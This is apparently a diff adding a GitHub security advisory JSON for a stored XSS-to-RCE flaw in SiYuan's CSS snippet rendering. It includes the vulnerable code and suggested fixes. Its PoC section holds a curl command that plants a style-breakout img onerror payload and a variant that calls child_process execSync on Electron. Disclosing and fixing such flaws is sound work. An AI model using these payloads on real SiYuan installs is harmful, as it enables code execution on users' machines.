@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-mvjr-vv3c-w4qv",
+  "modified": "2026-07-10T19:31:23.670518Z",
+  "published": "2026-07-10T19:25:09Z",
+  "aliases": [
+    "CVE-2026-54067"
+  ],
+  "summary": "SiYuan: Stored XSS to RCE via CSS-snippet \u003cstyle\u003e breakout in renderSnippet()",
+  "details": "### Summary\n\nA CSS snippet body containing `\u003c/style\u003e` breaks out of its surrounding `\u003cstyle\u003e` tag when `renderSnippet()` interpolates it via `insertAdjacentHTML`. A payload like `\u003c/style\u003e\u003cimg src=x onerror=\"...\"\u003e` runs arbitrary JavaScript in the renderer. On Electron desktop builds the renderer runs with `nodeIntegration:true`, so `require('child_process')` is reachable from the injected handler and the XSS chains to host RCE. Snippets sync via the workspace repository, so an attacker with write access to any synced workspace plants the payload once and it fires on every device that pulls.\n\nThe bug also bypasses the user's `enabledCSS` / `enabledJS` separation. A user who turned `enabledJS` off was making a deliberate call not to run untrusted JavaScript; the CSS path runs it anyway.\n\n### Details\n\nAffected:\n\n- HEAD `96dfe0b` (v3.6.5, 2026-04-21)\n- Sink: `app/src/config/util/snippets.ts:32`\n- Source: `/api/snippet/getSnippet`, backed by `data/snippets/conf.json`\n- Default config: `EnabledCSS: true`, `EnabledJS: true` at `kernel/conf/snippet.go:26-27`\n- Electron config: `nodeIntegration:true`, `contextIsolation:false`, `webSecurity:false` on every `BrowserWindow` in `app/electron/main.js:307,408-411,1107-1110,1150-1153,1322`\n\nThe write path stores raw content. `kernel/api/snippet.go:107-130` copies `Content` from the request straight into the snippet record with no HTML escape, no `\u003c/style\u003e` check, no type-specific validation:\n\n```go\nsnippet := \u0026conf.Snippet{\n    ID:      m[\"id\"].(string),\n    Name:    m[\"name\"].(string),\n    Type:    m[\"type\"].(string),\n    Content: m[\"content\"].(string),\n    Enabled: m[\"enabled\"].(bool),\n}\n```\n\nStorage is workspace-internal and syncs. `kernel/model/repository.go:1748,1798` reference `data/snippets/conf.json`, so the malicious record propagates to every sync peer.\n\nThe renderer reads the snippet back through `/api/snippet/getSnippet` and interpolates it into a `\u003cstyle\u003e` tag, raw. `app/src/config/util/snippets.ts:32`, called on app boot and on the `reloadSnippet` WebSocket event:\n\n```ts\nfetchPost(\"/api/snippet/getSnippet\", {type: \"all\", enabled: 2}, (response) =\u003e {\n  response.data.snippets.forEach((item: ISnippet) =\u003e {\n    const id = `snippet${item.type === \"css\" ? \"CSS\" : \"JS\"}${item.id}`;\n    if (item.type === \"css\") {\n      document.head.insertAdjacentHTML(\"beforeend\", `\u003cstyle id=\"${id}\"\u003e${item.content}\u003c/style\u003e`);\n    } else if (item.type === \"js\") {\n      // intentional script-loading path\n    }\n  });\n});\n```\n\n`${item.content}` lands inside the `\u003cstyle\u003e` tag. The HTML parser closes the style on the first `\u003c/style\u003e` substring and treats anything after as a sibling of the empty `\u003cstyle\u003e` element.\n\nWorth noting: the JS branch right after the CSS one already does the safe thing. It uses `document.createElement(\"script\")` and sets `el.text = item.content`. That's a text-node assignment, no HTML parsing. The CSS branch just doesn't use the equivalent on a `\u003cstyle\u003e` element, and that's the bug.\n\n#### Suggested fix\n\nThe cleanest fix mirrors what the JS branch already does. Build the element with `createElement` and set `textContent`:\n\n```ts\nif (item.type === \"css\") {\n  const el = document.createElement(\"style\");\n  el.id = id;\n  el.textContent = item.content;\n  document.head.appendChild(el);\n}\n```\n\n`textContent` on a `\u003cstyle\u003e` element populates the CSS rules without invoking the HTML parser, so `\u003c/style\u003e` in the body is a 4-character text node instead of a close tag.\n\nIf touching that line is undesirable, the smaller patch is to escape `\u003c` before interpolation:\n\n```ts\nconst safe = item.content.replace(/[\u0026\u003c]/g, c =\u003e c === \"\u0026\" ? \"\u0026amp;\" : \"\u0026lt;\");\ndocument.head.insertAdjacentHTML(\"beforeend\", `\u003cstyle id=\"${id}\"\u003e${safe}\u003c/style\u003e`);\n```\n\nEither fix on its own closes the bug. Worth also rejecting `\u003c/style\u003e` on the `setSnippet` backend handler so older renderers pulling the same synced workspace stay safe.\n\n### PoC\n\nStand up SiYuan:\n\n```bash\ndocker run -d --name siyuan-poc \\\n  -v ./workspace:/siyuan/workspace \\\n  -p 16806:6806 \\\n  b3log/siyuan:latest \\\n  --workspace=/siyuan/workspace --accessAuthCode=hunter2\n```\n\nPlant the snippet:\n\n```bash\nTOKEN=$(jq -r '.api.token' workspace/conf/conf.json)\n\ncurl -X POST http://localhost:16806/api/snippet/setSnippet \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token $TOKEN\" \\\n  -d '{\"snippets\":[{\"id\":\"\",\"name\":\"poc\",\"type\":\"css\",\"enabled\":true,\"content\":\"\u003c/style\u003e\u003cimg src=x onerror=\\\"document.title=\\\\\\\"SIYUAN_XSS\\\\\\\";window.__siyuan_xss=true\\\"\u003e\"}]}'\n```\n\nReturns `{\"code\":0,\"msg\":\"\",\"data\":null}`. The snippet now sits at `workspace/data/snippets/conf.json` verbatim.\n\nOpen `http://localhost:16806/stage/build/desktop/?r=1` or the Electron app pointing at the same workspace, authenticate, and run in DevTools:\n\n```js\n({\n  markerFired: window.__siyuan_xss === true,\n  styleCount: document.querySelectorAll('style[id^=\"snippetCSS\"]').length,\n  imgsInHead: document.head.querySelectorAll('img').length,\n  snippetStyleEmpty: document.querySelector('style[id^=\"snippetCSS\"]')?.textContent.length === 0\n})\n```\n\nResult from my run on 2026-05-19 against `b3log/siyuan:latest`:\n\n```json\n{\n  \"markerFired\": true,\n  \"styleCount\": 1,\n  \"imgsInHead\": 1,\n  \"snippetStyleEmpty\": true\n}\n```\n\n`document.title` is `SIYUAN_XSS`. The `\u003cstyle\u003e` exists but closed empty on the first `\u003c/style\u003e`. The smuggled `\u003cimg\u003e` is a sibling in `\u003chead\u003e`. The injected `onerror` ran arbitrary JS.\n\nTo turn it into RCE on Electron, swap the marker payload for:\n\n```html\n\u003cimg src=x onerror=\"require('child_process').execSync('open /Applications/Calculator.app')\"\u003e\n```\n\n`require` is reachable from the renderer because of `nodeIntegration:true` in `app/electron/main.js:408`.\n\n### Impact\n\nStored XSS to RCE on Electron desktop builds, plus XSS on mobile and Docker web builds.\n\nThe payload fires whenever the renderer refreshes snippets: on boot, on manual reload, or on a `reloadSnippet` WebSocket push. No user click required beyond having the app open.\n\nAnyone affected by a workspace-write compromise is exposed. Realistic paths in: compromised SiYuan Cloud / S3 / WebDAV sync credentials, a workspace folder mounted on a shared filesystem (Dropbox, Syncthing, network share, git), or a multi-user Docker server where any authenticated user can call `/api/snippet/setSnippet`. Once the malicious snippet is in the workspace, every peer that syncs and has `enabledCSS:true` runs the payload.\n\nThe bug also silently bypasses the user's snippet-toggle intent. Someone who turned `enabledJS` off and left `enabledCSS` on was making a deliberate decision not to run untrusted JavaScript. The CSS path runs it anyway.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/siyuan-note/siyuan/kernel",
+        "purl": "pkg:golang/github.com/siyuan-note/siyuan/kernel"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260628153353-2d5d72223df4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-mvjr-vv3c-w4qv/GHSA-mvjr-vv3c-w4qv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvjr-vv3c-w4qv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54067"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/siyuan-note/siyuan"
+    }
+  ]
+}
